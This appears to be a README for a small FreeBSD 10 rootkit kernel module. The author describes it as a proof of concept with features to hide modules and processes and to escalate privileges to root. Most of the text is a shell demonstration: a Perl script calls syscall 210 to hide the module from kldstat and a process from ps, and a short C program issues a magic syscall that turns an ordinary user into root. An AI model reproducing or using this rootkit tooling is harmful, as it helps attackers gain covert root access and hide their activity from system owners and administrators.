This is a small rootkit for FreeBSD 10 AMD64. Initially, it was just a POC for a rootkit I've written to test some stuff in MSR (Model Specific Registers) a long time ago but now I have added more two features in it. Now it can be used to hide a module or process and escalate the privileges to root. There's an easy way to know if this rootkit is already on the system, you just need to load the module again and the kernel will tell you if the file exists or not.

It has been tested on FreeBSD 10.0-RELEASE AMD64.

Demonstration:

```
$ su
Password:
root@rootkit:/usr/home/andersonc0d3 # kldload rootkit_amd64/rk.ko 
root@rootkit:/usr/home/andersonc0d3 # exit
exit
$ cd rootkit_amd64
$ cat hideme.c
int main(void){
	while(1);
	return 0;
}
$ ./hideme &
$ echo $!
985
$ ps -p 985
PID TT  STAT    TIME COMMAND
985  0  R    0:06.57 ./hideme
$ kldstat
Id Refs Address            Size     Name
 1    6 0xffffffff80200000 16314c0  kernel
 2    1 0xffffffff81a12000 2a53     uhid.ko
 3    1 0xffffffff81a15000 4b0      rk.ko
$ cat exec.pl
#!/usr/bin/perl

use strict;
use warnings;

my $a="rk";
my $b="./hideme";

# syscall(210,1)  # hook the interrupt handler
#
# syscall (210,0) # remove the hook from interrupt handler
#
# call syscall to hide a module
#

syscall(210,3,$a);

# call syscall to hide a process
#
#
syscall(210,4,$b);
$ perl exec.pl
$ ps -p 985
PID TT  STAT TIME COMMAND
$ kldstat
Id Refs Address            Size     Name
 1    6 0xffffffff80200000 16314c0  kernel
 2    1 0xffffffff81a12000 2a53     uhid.ko
$ id
uid=1001(andersonc0d3) gid=1001(andersonc0d3) groups=1001(andersonc0d3),0(wheel)
$ cat getroot.c
#include <stdio.h>
#include <stdlib.h>

int main(void){
	
	asm("mov $0x31337,%rax");	
	asm("syscall");

	return 0;
}
$ ./getroot
uid: 1001
$ id
uid=0(root) gid=0(wheel) groups=0(wheel)
$ su
root@rootkit:/usr/home/andersonc0d3/rootkit_amd64 #
```
